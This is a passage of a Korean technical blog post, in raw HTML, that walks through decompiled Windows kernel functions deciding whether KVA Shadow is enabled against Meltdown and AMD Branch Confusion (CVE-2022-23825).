class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">KPRCB</span> *<span class="hljs-title">CurrentPrcb</span>;</span> <span class="hljs-comment">// rdi</span><span class="hljs-comment">//...</span>  <span class="hljs-keyword">if</span> ( !KeGetPcr()-&gt;Prcb.Number )    KiInitializeNxSupportDiscard(v19, v18, v20);  HalInitializeProcessor(Number, a1, v20);  KiSetFeatureBits(CurrentPrcb);                <span class="hljs-comment">// Set Prcb Feature Bits</span>  CurrentPCB_Number = CurrentPrcb-&gt;Number;  v27 = KiSystemCall32;  v28 = KiSystemCall64;  <span class="hljs-keyword">if</span> ( !CurrentPCB_Number )  {    KiEnableKvaShadowing(CurrentPrcb);              <span class="hljs-comment">// KVA Shadow &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;</span>    CurrentPCB_Number = CurrentPrcb-&gt;Number;  }  <span class="hljs-keyword">if</span> ( KiKvaShadow )                             <span class="hljs-comment">// KVA Shadow &#xD50C;&#xB798;&#xADF8;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xBA74;</span>  {    v27 = KiSystemCall32Shadow;                 <span class="hljs-comment">// KiSystemCall32/KiSystemCall64 &#xB300;&#xC2E0; </span>    v28 = KiSystemCall64Shadow;                 <span class="hljs-comment">// KiSystemCall32Shadow/KiSystemCall64Shadow &#xC0AC;&#xC6A9;</span>  }  <span class="hljs-comment">//...</span>}<span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiSetFeatureBits</span><span class="hljs-params">(_KPRCB *CurrentPRCB)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">char</span> CpuType; <span class="hljs-comment">// bl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> CpuModel; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor; <span class="hljs-comment">// dl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ProcessorSignature; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuStepping; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int8 v57; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">unsigned</span> __int64 v58; <span class="hljs-comment">// rcx</span><span class="hljs-comment">//...</span>  CpuType = CurrentPRCB-&gt;CpuType_Family;        <span class="hljs-comment">// CpuType = Processor Family</span>  CpuModel = CurrentPRCB-&gt;CpuModel;  CpuVendor = CurrentPRCB-&gt;CpuVendor;  v123 = (CpuVendor - <span class="hljs-number">1</span>) &lt;= <span class="hljs-number">1u</span>;  <span class="hljs-keyword">if</span> ( CurrentPRCB-&gt;Number )  {    ProcessorSignature = KiGetProcessorSignature(<span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);    KiSetProcessorSignature(CurrentPRCB, ProcessorSignature);    <span class="hljs-keyword">goto</span> LABEL_40;  }<span class="hljs-comment">//... </span>  KiDetectKvaLeakage(CurrentPRCB);      <span class="hljs-comment">// Detect - KVA needs to be activated</span>  _m_prefetchw(CurrentPRCB);  <span class="hljs-keyword">if</span> ( CurrentPRCB-&gt;CpuVendor == <span class="hljs-number">1</span> )  {    v52 |= <span class="hljs-number">0x100000</span>u;    HIDWORD(v134) = v52;  }<span class="hljs-comment">//...</span>}</code></pre><h2 id="KVAS-Activation-for-Meltdown"><a href="#KVAS-Activation-for-Meltdown" class="headerlink" title="KVAS Activation for Meltdown"></a>KVAS Activation for Meltdown</h2><p>&#xC704; &#xD638;&#xCD9C; &#xCCB4;&#xC778;&#xC5D0;&#xC11C; <code>KiDetectKvaLeakage</code> &#xD568;&#xC218;&#xAC00; &#xBC14;&#xB85C; KVA &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xCF54;&#xC5B4; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">KiDetectKvaLeakage</span><span class="hljs-params">(_KPRCB *a1)</span></span><span class="hljs-function"></span>{  __int64 p_CpuVendor; <span class="hljs-comment">// rsi</span>  <span class="hljs-keyword">unsigned</span> __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 v4; <span class="hljs-comment">// rcx</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RDX; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">unsigned</span> __int64 v13; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">bool</span> v14; <span class="hljs-comment">// zf</span>  <span class="hljs-keyword">int</span> *v15; <span class="hljs-comment">// rdx</span>  <span class="hljs-keyword">int</span> v16; <span class="hljs-comment">// ecx</span>  __int64 v17; <span class="hljs-comment">// rbx</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  __int64 _RAX; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Number; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">int</span> v29[<span class="hljs-number">6</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-20h] BYREF</span>  v29[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  p_CpuVendor = &amp;a1-&gt;CpuVendor;    <span class="hljs-comment">// Check 1</span>  LODWORD(_RAX) = KiIsKvaShadowNeededForBranchConfusion(a1);  <span class="hljs-keyword">if</span> ( _RAX )    <span class="hljs-keyword">goto</span> ENABLE_KVAS_BRANCH_CONFUSION;  LODWORD(_RAX) = *p_CpuVendor;    <span class="hljs-comment">// Check 2</span>  <span class="hljs-comment">// Intel - Check with bitmask</span>  <span class="hljs-keyword">if</span> ( *p_CpuVendor == <span class="hljs-number">2</span> )  {    _RAX = a1-&gt;CpuModel;    <span class="hljs-keyword">if</span> ( a1-&gt;CpuType == <span class="hljs-number">6</span> &amp;&amp; _RAX &lt;= <span class="hljs-number">0x36</span>u )    {      v4 = <span class="hljs-number">0x6000C010000000</span>i64;      <span class="hljs-keyword">if</span> ( _bittest64(&amp;v4, _RAX) )        <span class="hljs-keyword">return</span> _RAX;    }  }  <span class="hljs-comment">// Others - disable KVAS</span>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( _RAX != <span class="hljs-number">3</span> || a1-&gt;CpuType == <span class="hljs-number">6</span> &amp;&amp; a1-&gt;CpuModel == <span class="hljs-number">13</span>)  {    <span class="hljs-keyword">return</span> _RAX;  }<span class="hljs-comment">// Check 3</span><span class="hljs-comment">// IA32_ARCH_CAPABILITIES support query</span>  _RAX = <span class="hljs-number">0</span>i64;  __asm { cpuid }  <span class="hljs-keyword">if</span> ( _RAX &lt; <span class="hljs-number">7</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;  _RAX = <span class="hljs-number">7</span>i64;  __asm { cpuid }  <span class="hljs-keyword">if</span> ( (_RDX &amp; <span class="hljs-number">0x20000000</span>) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;<span class="hljs-comment">// Check 3</span><span class="hljs-comment">// msr address 0x10A - IA32_ARCH_CAPABILITIES</span>  _RAX = __readmsr(<span class="hljs-number">0x10A</span>u);  <span class="hljs-comment">//IA32_ARCH_CAPABILITIES bit 0 : RDCL_NO</span>  <span class="hljs-keyword">if</span> ( (_RAX &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">goto</span> ENABLE_KVAS;   KiMicrocodeTrackerEnabled = <span class="hljs-number">1</span>;  LODWORD(_RAX) = <span class="hljs-number">3670016</span>;  LOBYTE(v13) = (KeFeatureBits2 &amp; <span class="hljs-number">0x28</span>) == <span class="hljs-number">8</span>;  <span class="hljs-keyword">if</span> ( (KeFeatureBits2 &amp; <span class="hljs-number">0x380000</span>) != <span class="hljs-number">3670016</span> )  {    LODWORD(_RAX) = KiIsFbClearSupported(KeFeatureBits2 &amp; <span class="hljs-number">0x380000</span>, v13);    LOBYTE(v13) = _RAX | v13;  }  <span class="hljs-keyword">if</span> ( v13 )  {ENABLE_KVAS:    <span class="hljs-keyword">if</span> ( a1-&gt;Number &amp;&amp; !KiKvaLeakage )      KeBugCheckEx(<span class="hljs-number">0x5D</span>u, <span class="hljs-number">0x4B56414C</span>ui64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);ENABLE_KVAS_BRANCH_CONFUSION:    v14 = *p_CpuVendor == <span class="hljs-number">2</span>;    **KiKvaLeakage = <span class="hljs-number">1</span>;**<span class="hljs-comment">//... for enable KVA</span>  }  <span class="hljs-keyword">return</span> _RAX;}</code></pre><p><code>KiDetectKvaLeakage</code> &#xD568;&#xC218;&#xB294; KPRCB&#xC5D0; &#xD3EC;&#xD568;&#xB41C; CPU &#xBCA4;&#xB354; &#xBC0F; &#xBAA8;&#xB378; &#xC815;&#xBCF4;&#xC640;, MSR&#xC744; &#xC77D;&#xC5B4; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB97C; &#xD1B5;&#xD574; KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. &#xD655;&#xC778;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC740; &#xD06C;&#xAC8C; &#xC138; &#xAC00;&#xC9C0;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="Check-1"><a href="#Check-1" class="headerlink" title="Check 1"></a>Check 1</h3><ul><li><code>KiIsKvaShadowNeededForBranchConfusion</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Branch Confusion &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xBC1B;&#xB294;&#xC9C0; &#xD655;&#xC778;</li><li>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xD638;&#xCD9C; &#xACB0;&#xACFC; Branch Confusion &#xCDE8;&#xC57D;&#xC810; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xACBD;&#xC6B0; KVAS&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; <code>ENABLE_KVAS_BRANCH_CONFUSION</code> &#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xD589;</li></ul><h3 id="Check-2"><a href="#Check-2" class="headerlink" title="Check 2"></a>Check 2</h3><ul><li>Meltdown&#xC5D0; &#xC601;&#xD5A5;&#xBC1B;&#xC9C0; &#xC54A;&#xC544; KVAS &#xD65C;&#xC131;&#xD654;&#xAC00; &#xD544;&#xC694; &#xC5C6;&#xB294; &#xAD6C;&#xD615; CPU&#xB97C; bitmask&#xB97C; &#xD1B5;&#xD574; &#xD544;&#xD130;&#xB9C1;&#xD558;&#xACE0; KVAS&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;</li><li>&#xB610;&#xD55C;, Meltdown&#xC740; Intel &#xD504;&#xB85C;&#xC138;&#xC11C; &#xC544;&#xD0A4;&#xD14D;&#xCCD0;&#xC5D0;&#xB9CC; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBBC0;&#xB85C; &#xB54C;&#xBB38;&#xC5D0; &#xADF8; &#xC678; &#xBCA4;&#xB354;&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB3C4; KVAS&#xB97C; &#xBE44;&#xD65C;&#xC131;&#xD654;</li></ul><h3 id="Check-3"><a href="#Check-3" class="headerlink" title="Check 3"></a>Check 3</h3><ul><li>&#xBA3C;&#xC800; CPU&#xAC00; MSR(Model Specific Register) &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xB294;&#xC9C0; &#xD655;&#xC778;<ul><li>MSR&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; Meltdown&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; &#xAD6C;&#xD615; CPU&#xC774;&#xBBC0;&#xB85C; KVAS &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; <code>ENABLE_KVAS</code> &#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xD589;</li><li>MSR&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xC9C0;&#xB9CC; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC9C0; &#xC54A;&#xB294; &#xBAA8;&#xB378;&#xC740; Check 2 &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; bitmask&#xB97C; &#xD1B5;&#xD574; &#xBA3C;&#xC800; &#xD544;&#xD130;&#xB9C1;</li></ul></li><li><code>__readmsr</code>&#xC744; &#xD1B5;&#xD574; MSR &#xC8FC;&#xC18C; <code>0x10A</code> &#xC77D;&#xAE30; - <a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html">IA32_ARCH_CAPABILITIES</a><ul><li>&#xACB0;&#xACFC;(<code>_RAX</code>)&#xC758; &#xD544;&#xB4DC; 0 (<code>RDCL_NO</code>) &#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC558;&#xC73C;&#xBA74; KVAS &#xD65C;&#xC131;&#xD654;&#xD558;&#xB294; <code>ENABLE_KVAS</code>&#xBD84;&#xAE30;&#xB85C; &#xC9C4;&#xD589;</li><li>RDCL_NO: Rogue Data Cache Load(Meltdown) &#xC5D0; &#xCDE8;&#xC57D;&#xD558;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xB098;&#xD0C0;&#xB0B4;&#xB294; &#xBE44;&#xD2B8; &#xD50C;&#xB798;&#xADF8;</li></ul></li></ul><p>&#xC704; &#xD655;&#xC778; &#xACFC;&#xC815;&#xC744; &#xD1B5;&#xD574; KVAS&#xAC00; &#xD544;&#xC694;&#xD558;&#xB2E4;&#xACE0; &#xD310;&#xB2E8;&#xB418;&#xBA74; <code>KiKvaLeakage</code>&#xB97C; 1&#xB85C; &#xC124;&#xC815;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC694; &#xAE30;&#xB2A5;&#xC740; Check 2&#xC640; Chekc3&#xC758; Meltdown &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xBC1B;&#xB294; Intel &#xD504;&#xB85C;&#xC138;&#xC11C;&#xB97C; &#xC2DD;&#xBCC4;&#xD558;&#xACE0; KVAS &#xD65C;&#xC131;&#xD654; &#xD50C;&#xB798;&#xADF8;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xC694;&#xC57D;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;. Check 1&#xC740; &#xC544;&#xB798;&#xC5D0;&#xC11C; &#xB354; &#xC790;&#xC138;&#xD558;&#xAC8C; &#xC124;&#xBA85;&#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="KVAS-Activation-for-Branch-Confusion"><a href="#KVAS-Activation-for-Branch-Confusion" class="headerlink" title="KVAS Activation for Branch Confusion"></a>KVAS Activation for Branch Confusion</h2><p>KVAS&#xB294; Meltdown&#xB9CC; &#xC801;&#xC6A9;&#xB418;&#xB294; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xADF8;&#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB294; &#xD568;&#xC218;&#xAC00; Check 1 &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xB294; <code>KiIsKvaShadowNeededForBranchConfusion</code> &#xC778;&#xB370;&#xC694;.</p><pre><code class="hljs powershell">__int64 __fastcall KiIsKvaShadowNeededForBranchConfusion(__int64 a1){  unsigned int v2; // ebx  __int128 v4; // [<span class="hljs-type">rsp</span>+<span class="hljs-number">20</span><span class="hljs-type">h</span>] [<span class="hljs-type">rbp</span>-<span class="hljs-number">28</span><span class="hljs-type">h</span>] BYREF  __int64 v5; // [<span class="hljs-type">rsp</span>+<span class="hljs-number">30</span><span class="hljs-type">h</span>] [<span class="hljs-type">rbp</span>-<span class="hljs-number">18</span><span class="hljs-type">h</span>]  v5 = <span class="hljs-number">0</span>i64;  v4 = <span class="hljs-number">0</span>i64;  KiDetectHardwareSpecControlFeatures(a1, <span class="hljs-number">0</span>i64, (__int64)&amp;v4, <span class="hljs-number">0</span>i64);  <span class="hljs-keyword">if</span> ( (v4 &amp; <span class="hljs-number">0</span>x8000) == <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  v2 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( !(unsigned int)KiIsBranchConfusionMitigationDesired(a1, &amp;v4) )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  LOBYTE(v2) = (unsigned int)KiIsBranchConfusionMitigationSupported(a1, &amp;v4) != <span class="hljs-number">0</span>;  <span class="hljs-keyword">return</span> v2;}</code></pre><p>&#xD568;&#xC218;&#xBA85;&#xC5D0;&#xC11C;&#xB3C4; &#xC54C; &#xC218; &#xC788;&#xB4EF;, Branch Confusion &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294; CPU&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xACE0; KVA Shadow &#xD65C;&#xC131;&#xD654;&#xAC00; &#xD544;&#xC694;&#xD55C;&#xC9C0; &#xACB0;&#xC815;&#xD558;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;.</p><ul><li><code>KiDetectHardwareSpecControlFeatures</code> &#xD568;&#xC218; &#xD638;&#xCD9C; &#xACB0;&#xACFC;&#xC778; <code>v4</code> &#xC758; <code>0x8000</code> &#xBE44;&#xD2B8;&#xAC00; 1&#xC774;&#xBA74; Branch Confusion&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC74C;</li><li>&#xC774;&#xD6C4; &#xAD00;&#xB828; Mitigation&#xC774; &#xC9C0;&#xC6D0;&#xB418;&#xBA74; True &#xBC18;&#xD658; - <code>KiDetectKvaLeakage</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; KVAS &#xD65C;&#xC131;&#xD654; &#xB8E8;&#xD2F4;&#xC73C;&#xB85C; &#xC9C4;&#xC785;&#xD568;</li></ul><p><code>KiDetectHardwareSpecControlFeatures</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xC8E0;</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">char</span> *__fastcall <span class="hljs-title">KiDetectHardwareSpecControlFeatures</span><span class="hljs-params">(_KPRCB *PRCB, __int64 _zero, __int64 result2, <span class="hljs-keyword">char</span> *__zero)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> CpuModel_1; <span class="hljs-comment">// r14d</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">char</span> CpuType_Family; <span class="hljs-comment">// r12</span>  <span class="hljs-keyword">bool</span> IsAnyHypervisorPresent; <span class="hljs-comment">// r9</span>  <span class="hljs-keyword">char</span> CpuVendor_2; <span class="hljs-comment">// bl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ProcessorFlags; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuModel; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuStepping; <span class="hljs-comment">// al</span><span class="hljs-comment">//...</span>  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor_1; <span class="hljs-comment">// [rsp+20h] [rbp-60h]</span>      CpuVendor = PRCB-&gt;CpuVendor;  CpuType_Family = PRCB-&gt;CpuType_Family;  LOBYTE(CpuModel_1) = PRCB-&gt;CpuModel;<span class="hljs-comment">//...</span>  CpuVendor_1 = CpuVendor;  v48 = <span class="hljs-number">1</span>;    <span class="hljs-comment">// Hypervisor check</span>  <span class="hljs-keyword">if</span> ( HviIsHypervisorMicrosoftCompatible() )  {    HviGetEnlightenmentInformation(&amp;v54);    v53 = <span class="hljs-number">0</span>i64;    HviGetHypervisorFeatures(&amp;v53);    <span class="hljs-keyword">if</span> ( (v53 &amp; <span class="hljs-number">0x100000000000</span>i64) == <span class="hljs-number">0</span> || (v54 &amp; <span class="hljs-number">0x1000</span>) != <span class="hljs-number">0</span> )    {      IsAnyHypervisorPresent = <span class="hljs-number">1</span>;    }    <span class="hljs-keyword">else</span>    {      IsAnyHypervisorPresent = <span class="hljs-number">0</span>;      v48 = <span class="hljs-number">0</span>;    }  }  <span class="hljs-keyword">else</span>  {    IsAnyHypervisorPresent = HviIsAnyHypervisorPresent();    v48 = IsAnyHypervisorPresent;  }  v11 = result1;  <span class="hljs-keyword">if</span> ( KiIsBranchConfusionPresent(PRCB) )  {    v11 |= <span class="hljs-number">0x8000</span>ui64;    *&amp;result1 = v11;  }<span class="hljs-comment">//...</span>  *result2 = result1;  *(result2 + <span class="hljs-number">16</span>) = <span class="hljs-number">4</span>i64;  result = __zero;  <span class="hljs-keyword">if</span> ( __zero )    *__zero = v8;  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xCD94;&#xCE21; &#xC2E4;&#xD589; &#xAE30;&#xBC18; side-channel &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC788;&#xC9C0;&#xB9CC;, &#xCF54;&#xB4DC;&#xB97C; &#xB2E4; &#xC4F0;&#xAE30;&#xC5D0;&#xB294; &#xB108;&#xBB34; &#xAE30;&#xB2C8;&#xAE4C; KVAS &#xD65C;&#xC131;&#xD654;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; <code>0x8000</code> &#xBE44;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB9CC; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xCD94;&#xCE21; &#xC2E4;&#xD589; &#xAD00;&#xB828; &#xCDE8;&#xC57D;&#xC810; &#xBAA9;&#xB85D;&#xC740; <a href="https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11">MS &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xB4DC; &#xAC00;&#xC774;&#xB358;&#xC2A4;</a> &#xCC38;&#xACE0;</li></ul><p><code>KiIsBranchConfusionPresent</code> &#xD568;&#xC218; &#xBC18;&#xD658;&#xAC12;&#xC774; True&#xBA74; <code>0x8000</code> &#xBE44;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB124;&#xC694;.</p><p><code>KiIsBranchConfusionPresent</code></p><pre><code class="hljs jsx">__int64 __fastcall KiIsBranchConfusionPresent(_KPRCB *a1){  bool IsAnyHypervisorPresent; <span class="hljs-comment">// al</span>  unsigned int v3; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">if</span> ( a1-&gt;CpuVendor != <span class="hljs-number">1</span> || (KeFeatureBits2 &amp; <span class="hljs-number">0x1000000</span>) != <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  IsAnyHypervisorPresent = HviIsAnyHypervisorPresent();  v3 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( IsAnyHypervisorPresent )    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>i64;  LOBYTE(v3) = a1-&gt;CpuType_Family != <span class="hljs-number">25</span>;  <span class="hljs-keyword">return</span> v3;}</code></pre><p>&#xD568;&#xC218; &#xB85C;&#xC9C1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>CpuVendor&#xAC00; AMD&#xAC00; &#xC544;&#xB2C8;&#xBA74; False &#xBC18;&#xD658;<ul><li>Branch Confusion&#xC740; AMD CPU&#xC5D0;&#xB9CC; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xCDE8;&#xC57D;&#xC810;(<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825">CVE-2022-23825</a>)</li></ul></li><li><code>HviIsAnyHypervisorPresent</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Hypervisor&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; True &#xBC18;&#xD658;<ul><li>CVE-2022-23825&#xB294; &#xAC00;&#xC0C1;&#xD654; &#xD658;&#xACBD;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBBC0;&#xB85C; Hyperviosr&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; KVAS&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xB428;</li></ul></li><li>Family Number&#xAC00; Zen 3 / Zen 3+ / Zen 4 &#xC778; 25 &#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; True &#xBC18;&#xD658;<ul><li>&#xADF8; &#xC678; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB294; &#xC601;&#xD5A5;&#xBC1B;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC74C;</li></ul></li></ol><p>&#xC774;&#xD6C4; <code>KiEnableKvaShadowing</code> &#xC5D0;&#xC11C; KVAS &#xD65C;&#xC131;&#xD654; &#xC804; &#xB9C8;&#xC9C0;&#xB9C9; &#xAC80;&#xC0AC;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiEnableKvaShadowing</span><span class="hljs-params">(_KPRCB *a1)</span></span><span class="hljs-function"></span>{  __int64 v2; <span class="hljs-comment">// rdx</span>  __int64 v3; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// rax</span>  __int64 v6; <span class="hljs-comment">// rdx</span>  __int64 v7; <span class="hljs-comment">// r11</span>  <span class="hljs-keyword">unsigned</span> __int8 v8; <span class="hljs-comment">// cf</span>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int64 v10; <span class="hljs-comment">// rax</span>  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int16 v12; <span class="hljs-comment">// cx</span>  <span class="hljs-keyword">if</span> ( KiIsKvaShadowDisabled() )  {    KiIsKvaShadowConfigDisabled = <span class="hljs-number">1</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> ( (KeFeatureBits2 &amp; <span class="hljs-number">0x18000</span>) == <span class="hljs-number">0x8000</span> )      *(_QWORD *)(v3 + <span class="hljs-number">11520</span>) = <span class="hljs-number">3</span>i64;    v4 = KiKernelCetEnabled;    <span class="hljs-keyword">if</span> ( !(_BYTE)KiKernelCetEnabled &amp;&amp; (<span class="hljs-keyword">unsigned</span> __int8)KiIsKvaLeakSimulated() )      KiKvaLeakageSimulate = <span class="hljs-number">1</span>;        <span class="hljs-comment">// Enable KVAS</span>    <span class="hljs-keyword">if</span> ( KiKvaLeakage || KiKvaLeakageSimulate )    {      <span class="hljs-keyword">if</span> ( v4 )        KeBugCheckEx(<span class="hljs-number">0x5D</span>u, <span class="hljs-number">0x4B766120</span>ui64, <span class="hljs-number">0x4B434554</span>ui64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);      v5 = __readcr3();      a1-&gt;KernelDirectoryTableBase = v5;      *(_QWORD *)(v2 + <span class="hljs-number">4216</span>) = *(_QWORD *)(v2 + <span class="hljs-number">4100</span>);      KiInitializeDescriptorIst(a1);      *(_QWORD *)(v7 + <span class="hljs-number">4100</span>) = v7 + <span class="hljs-number">16896</span>;      <span class="hljs-keyword">if</span> ( a1-&gt;Number )      {        result = KiShadowProcessorAllocation(a1, v7);        <span class="hljs-keyword">if</span> ( 